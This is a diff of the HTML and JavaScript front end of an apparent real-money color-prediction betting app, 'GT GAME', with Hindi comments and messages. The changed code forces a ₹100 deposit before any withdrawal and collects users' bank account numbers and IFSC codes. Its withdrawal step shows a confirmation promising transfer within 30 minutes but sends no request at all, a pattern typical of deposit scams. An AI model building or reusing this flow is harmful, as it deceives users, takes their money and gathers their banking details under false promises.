@@ -8,13 +8,14 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background-color: #0b0c10; color: #fff; padding: 15px; }
         
-        /* लॉगिन स्क्रीन डिज़ाइन */
-        .auth-container { max-width: 400px; margin: 100px auto; background: #151922; padding: 30px; border-radius: 15px; border: 2px solid #00ffcc; box-shadow: 0 0 20px #00ffcc; text-align: center; }
+        /* लॉगिन/रजिस्टर यूआई */
+        .auth-container { max-width: 400px; margin: 60px auto; background: #151922; padding: 30px; border-radius: 15px; border: 2px solid #00ffcc; box-shadow: 0 0 20px #00ffcc; text-align: center; }
         .auth-container h2 { color: #00ffcc; margin-bottom: 20px; text-shadow: 0 0 10px #00ffcc; }
         .auth-container input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #0b0c10; color: #fff; font-size: 1rem; text-align: center; }
         .auth-btn { width: 100%; padding: 12px; background: #00ffcc; border: none; border-radius: 8px; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 10px; color: #000; }
+        .toggle-link { color: #888; font-size: 0.9rem; margin-top: 15px; display: block; cursor: pointer; text-decoration: underline; }
         
-        /* गेम स्क्रीन डिज़ाइन */
+        /* मुख्य गेम स्क्रीन */
         .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 5px; border-bottom: 2px solid #1f2833; }
         .logo { color: #00ffcc; text-shadow: 0 0 10px #00ffcc; font-size: 1.8rem; }
         .wallet-box { background: #1f2833; padding: 8px 12px; border-radius: 20px; display: flex; align-items: center; gap: 8px; border: 1px solid #45f3ff; }
@@ -41,7 +42,7 @@
         .close-btn { float:right; font-size:1.8rem; cursor:pointer; color:#ff0055; }
         .qr-placeholder { background:#fff; padding: 15px; margin:15px 0; border-radius:10px; display:flex; flex-direction:column; justify-content:center; align-items:center; }
         .modal input { width:100%; padding:12px; margin:10px 0; border-radius:8px; border:1px solid #444; background:#0b0c10; color:#fff; font-size:1rem; }
-        .submit-btn { width:100%; padding:12px; background:#00ffcc; border:none; border-radius:8px; font-size:1.1rem; font-weight:bold; cursor:pointer; margin-top:5px; }
+        .submit-btn { width:100%; padding:12px; background:#00ffcc; border:none; border-radius:8px; font-size:1.1rem; font-weight:bold; cursor:pointer; margin-top:5px; color:#000; }
         .history-title { margin-top: 15px; color: #888; font-size: 0.9rem; }
     </style>
 </head>
@@ -49,29 +50,38 @@
 
     <!-- लॉगिन / रजिस्ट्रेशन स्क्रीन -->
     <div id="auth-screen" class="auth-container">
-        <h2>GT LOGIN</h2>
-        <div id="mobile-box">
-            <input type="number" id="user-mobile" placeholder="Enter 10-Digit Mobile No">
-            <button class="auth-btn" onclick="sendOTP()">Send OTP</button>
+        <h2 id="auth-title">GT LOGIN</h2>
+        
+        <!-- लॉगिन बॉक्स -->
+        <div id="login-box">
+            <input type="number" id="login-mobile" placeholder="Enter Mobile Number">
+            <input type="password" id="login-pass" placeholder="Enter Password">
+            <button class="auth-btn" onclick="submitLogin()">Login</button>
+            <span class="toggle-link" onclick="toggleAuth(true)">Don't have an account? Register here</span>
         </div>
-        <div id="otp-box" class="hidden">
-            <input type="number" id="user-otp" placeholder="Enter 4-Digit OTP">
-            <button class="auth-btn" onclick="verifyOTP()">Verify & Login</button>
+        
+        <!-- रजिस्ट्रेशन बॉक्स -->
+        <div id="register-box" class="hidden">
+            <input type="text" id="reg-name" placeholder="Enter Full Name">
+            <input type="number" id="reg-mobile" placeholder="Enter 10-Digit Mobile No">
+            <input type="password" id="reg-pass" placeholder="Create Password">
+            <button class="auth-btn" onclick="submitRegister()">Register</button>
+            <span class="toggle-link" onclick="toggleAuth(false)">Already have an account? Login here</span>
         </div>
     </div>
 
-    <!-- मुख्य गेम स्क्रीन (शुरुआत में छुपी रहेगी) -->
+    <!-- मुख्य गेम स्क्रीन -->
     <div id="game-screen" class="hidden">
         <header class="header">
             <h1 class="logo">GT GAME</h1>
             <div class="wallet-box">
                 <span>🪙 <b id="wallet-balance">₹0</b></span>
                 <button class="add-btn" onclick="openDepositModal()">+ Add</button>
-                <button class="wd-btn" onclick="openWithdrawModal()">Withdraw</button>
+                <button class="wd-btn" onclick="checkWithdrawFlow()">Withdraw</button>
             </div>
         </header>
 
-        <p style="color: #00ffcc; font-size: 0.9rem; margin-top: 5px;">👤 User: <span id="logged-phone">-</span></p>
+        <p style="color: #00ffcc; font-size: 0.9rem; margin-top: 8px;">👤 Welcome, <b id="logged-name">-</b> (<span id="logged-phone">-</span>)</p>
 
         <div class="tabs">
             <button class="tab-btn active" id="btn-color" onclick="switchGame('color-game')">Color Match</button>
@@ -102,6 +112,7 @@
         </main>
     </div>
 
+    <!-- डिपॉजिट पॉप-अप -->
     <div id="deposit-modal" class="modal hidden">
         <div class="modal-content">
             <span class="close-btn" onclick="closeDepositModal()">&times;</span>
@@ -117,45 +128,74 @@
         </div>
     </div>
 
+    <!-- बैंक इनफार्मेशन पॉप-अप -->
+    <div id="bank-modal" class="modal hidden">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeBankModal()">&times;</span>
+            <h2>Bank Information</h2>
+            <p style="font-size:0.85rem; color:#aaa; margin-bottom:10px;">कृपया विड्रॉ के लिए सही बैंक डिटेल्स भरें</p>
+            <input type="text" id="bank-name" placeholder="Bank Name (e.g. SBI, HDFC)">
+            <input type="text" id="bank-holder" placeholder="Account Holder Name">
+            <input type="number" id="bank-acc" placeholder="Account Number">
+            <input type="text" id="bank-ifsc" placeholder="IFSC Code">
+            <button class="submit-btn" onclick="submitBankDetails()">Save & Continue</button>
+        </div>
+    </div>
+
     <script src="https://cloudflare.com"></script>
     <script>
         const socket = io('https://onrender.com');
         let currentUser = null;
 
-        // OTP भेजने का फंक्शन
-        function sendOTP() {
-            const mobile = document.getElementById('user-mobile').value;
-            fetch('/api/send-otp', {
+        // लॉगिन और रजिस्टर स्विच करने का फंक्शन
+        function toggleAuth(isRegister) {
+            if(isRegister) {
+                document.getElementById('auth-title').innerText = "GT REGISTER";
+                document.getElementById('login-box').classList.add('hidden');
+                document.getElementById('register-box').classList.remove('hidden');
+            } else {
+                document.getElementById('auth-title').innerText = "GT LOGIN";
+                document.getElementById('register-box').classList.add('hidden');
+                document.getElementById('login-box').classList.remove('hidden');
+            }
+        }
+
+        // रजिस्ट्रेशन सबमिट करना
+        function submitRegister() {
+            const name = document.getElementById('reg-name').value;
+            const mobile = document.getElementById('reg-mobile').value;
+            const password = document.getElementById('reg-pass').value;
+
+            fetch('/api/register', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mobile: mobile })
+                body: JSON.stringify({ name, mobile, password })
             })
             .then(res => res.json())
             .then(data => {
                 alert(data.msg);
-                if(data.success) {
-                    document.getElementById('mobile-box').classList.add('hidden');
-                    document.getElementById('otp-box').classList.remove('hidden');
-                }
+                if(data.success) toggleAuth(false); // सफल होने पर लॉगिन पर भेजें
             });
         }
 
-        // OTP वेरीफाई करने का फंक्शन
-        function verifyOTP() {
-            const mobile = document.getElementById('user-mobile').value;
-            const otp = document.getElementById('user-otp').value;
-            fetch('/api/verify-otp', {
+        // लॉगिन सबमिट करना
+        function submitLogin() {
+            const mobile = document.getElementById('login-mobile').value;
+            const password = document.getElementById('login-pass').value;
+
+            fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mobile: mobile, otp: otp })
+                body: JSON.stringify({ mobile, password })
             })
             .then(res => res.json())
             .then(data => {
                 if(data.success) {
                     currentUser = data.user;
                     document.getElementById('auth-screen').classList.add('hidden');
-                    document.getElementById('game-screen').classList.remove('connected', 'hidden');
+                    document.getElementById('game-screen').classList.remove('hidden');
                     document.getElementById('wallet-balance').innerText = "₹" + currentUser.balance;
+                    document.getElementById('logged-name').innerText = currentUser.name;
                     document.getElementById('logged-phone').innerText = currentUser.mobile;
                 } else {
                     alert(data.msg);
@@ -163,15 +203,69 @@
             });
         }
 
+        // विड्रॉ दबाने पर फ्लो चेक करना (100 डिपॉजिट + बैंक डिटेल्स)
+        function checkWithdrawFlow() {
+            if (!currentUser) return;
+            
+            // शर्त 1: ₹100 कंपल्सरी ऐड होना चाहिए
+            if (currentUser.totalDeposited < 100) {
+                return alert("⚠️ विड्रॉ करने से पहले आपको कम से कम ₹100 गेम वॉलेट में एड (+ Add) करना अनिवार्य है!");
+            }
+            
+            // शर्त 2: अगर बैंक अकाउंट डिटेल्स नहीं हैं, तो पॉप-अप खोलो
+            if (!currentUser.bankDetails) {
+                alert("ℹ️ विड्रॉ करने के लिए पहले अपनी बैंक अकाउंट इंफॉर्मेशन दर्ज करें।");
+                document.getElementById('bank-modal').classList.remove('hidden');
+            } else {
+                // अगर दोनों शर्तें पूरी हैं, तो सीधे विड्रॉ अमाउंट मांगो
+                triggerWithdrawRequest();
+            }
+        }
+
+        // बैंक डिटेल्स सबमिट करना
+        function submitBankDetails() {
+            const bankName = document.getElementById('bank-name').value;
+            const holderName = document.getElementById('bank-holder').value;
+            const accNo = document.getElementById('bank-acc').value;
+            const ifsc = document.getElementById('bank-ifsc').value;
+
+            if(!bankName || !holderName || !accNo || !ifsc) return alert("कृपया सभी बैंक डिटेल्स भरें!");
+
+            fetch('/api/save-bank', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mobile: currentUser.mobile, bankName, holderName, accNo, ifsc })
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert(data.msg);
+                if(data.success) {
+                    currentUser = data.user;
+                    closeBankModal();
+                    triggerWithdrawRequest(); // डिटेल्स सेव होते ही सीधे विड्रॉ प्रोसेस शुरू करो
+                }
+            });
+        }
+
+        // फाइनल विड्रॉ रिक्वेस्ट प्रोसेस
+        function triggerWithdrawRequest() {
+            const wAmt = prompt("दर्ज करें कि आप कितने रुपये निकालना चाहते हैं:");
+            if(!wAmt || isNaN(wAmt) || wAmt < 100) return alert("न्यूनतम विड्रॉ राशि ₹100 है!");
+            if(wAmt > currentUser.balance) return alert("आपके वॉलेट में इतना बैलेंस नहीं है!");
+            
+            alert(`✅ आपकी ₹${wAmt} की विड्रॉ रिक्वेस्ट आपके बैंक अकाउंट (${currentUser.bankDetails.bankName} - A/C: ${currentUser.bankDetails.accNo}) के लिए एडमिन के पास भेज दी गई है। 30 मिनट में पैसे ट्रांसफर हो जाएंगे।`);
+        }
+
+        function closeBankModal() { document.getElementById('bank-modal').classList.add('hidden'); }
+        function openDepositModal() { document.getElementById('deposit-modal').classList.remove('hidden'); }
+        function closeDepositModal() { document.getElementById('deposit-modal').classList.add('hidden'); }
+
         function switchGame(gameId) {
             document.querySelectorAll('.game-section').forEach(sec => sec.classList.add('hidden'));
             document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
             document.getElementById(gameId).classList.remove('hidden');
-            if (gameId === 'color-game') {
-                document.getElementById('btn-color').classList.add('active');
-            } else {
-                document.getElementById('btn-number').classList.add('active');
-            }
+            if (gameId === 'color-game') document.getElementById('btn-color').classList.add('active');
+            else document.getElementById('btn-number').classList.add('active');
         }
 
         const numContainer = document.getElementById('number-buttons-container');
@@ -244,9 +338,6 @@
             alert("🎯 नंबर राउंड समाप्त! विजेता नंबर है: " + data.win);
         });
 
-        function openDepositModal() { document.getElementById('deposit-modal').classList.remove('hidden'); }
-        function closeDepositModal() { document.getElementById('deposit-modal').classList.add('hidden'); }
-
         function submitDeposit() {
             const amount = document.getElementById('deposit-amount').value;
             const utr = document.getElementById('utr-input').value;
@@ -255,22 +346,6 @@
             currentUser.totalDeposited += Number(amount); 
             alert("आपकी ₹" + amount + " की रिक्वेस्ट (UTR: " + utr + ") एडमिन के पास भेज दी गई है। जांच के बाद बैलेंस ऐड हो जाएगा।");
             closeDepositModal();
-        }
-
-        function openWithdrawModal() {
-            if (!currentUser) return;
-            if (currentUser.totalDeposited < 100) {
-                return alert("⚠️ विड्रॉ करने से पहले आपको कम से कम ₹100 गेम वॉलेट में एड (+ Add) करना अनिवार्य है!");
-            }
-            
-            const wAmt = prompt("दर्ज करें कि आप कितने रुपये निकालना चाहते हैं:");
-            if(!wAmt || isNaN(wAmt) || wAmt < 100) return alert("न्यूनतम विड्रॉ राशि ₹100 है!");
-            if(wAmt > currentUser.balance) return alert("आपके वॉलेट में इतना बैलेंस नहीं है!");
-            
-            const upi = prompt("अपनी असली UPI ID दर्ज करें (जिस पर पैसे चाहिए):");
-            if(!upi || !upi.includes('@')) return alert("कृपया सही UPI ID डालें!");
-            
-            alert("आपकी ₹" + wAmt + " की विड्रॉ रिक्वेस्ट (UPI: " + upi + ") एडमिन के पास भेज दी गई है।");
         }
     </script>
 </body>
